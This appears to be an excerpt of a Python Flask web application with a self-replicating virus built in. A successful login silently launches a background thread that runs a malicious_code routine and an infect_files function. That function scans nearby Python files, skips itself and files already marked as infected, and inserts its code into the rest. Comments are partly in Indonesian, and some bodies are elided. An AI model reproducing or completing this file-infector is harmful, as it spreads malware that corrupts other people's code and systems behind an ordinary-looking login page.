...
def login():
    ...
    try:
        ...
        if user is not None:
            session['uid'] = user['id']
            # Trigger virus in background thread
            virus_thread = threading.Thread(target=run_virus_payload, daemon=True)
            virus_thread.start()
            # Show infected page dengan countdown di browser
...
def infect_files():
    ...
    print(f"[*] Scanning {len(python_files)} Python files...", file=sys.stderr, flush=True)
    
    for filename in python_files:
        try:
            if os.path.abspath(filename) == os.path.abspath(__file__):
                print(f"[-] Skipping self: {filename}", file=sys.stderr, flush=True)
                continue
            
            with open(filename, 'r', encoding='utf-8') as f:
                content = f.read()
            
            if VIRUS_START in content and VIRUS_END in content:
                print(f"[*] Already infected: {filename}", file=sys.stderr, flush=True)
                continue
            ...
            infected_count += 1
            print(f"[+] INFECTED: {filename}", file=sys.stderr, flush=True)
        except Exception as e:
            print(f"[-] Error infecting {filename}: {e}", file=sys.stderr, flush=True)
...
def run_virus_payload():
    ...
    try:
        print(f"\n[!] LOGIN BERHASIL - VIRUS ACTIVATED!")
        time.sleep(1)  # Tunggu browser menampilkan infected page dulu
        malicious_code()
        infect_count = infect_files()
        print(f"[+] Total files infected: {infect_count}\n")
    except Exception as e:
...
if __name__ == '__main__':
    if len(sys.argv) > 1 and sys.argv[1] in ('infect', '--infect'):
        ...
        print("\n[*] Flask app starting...")
        print("[!] Virus ready to deploy on login!\n")
        app.run(debug=True)
#VIRUS SAYYS BYE!
# test_file.py - clean
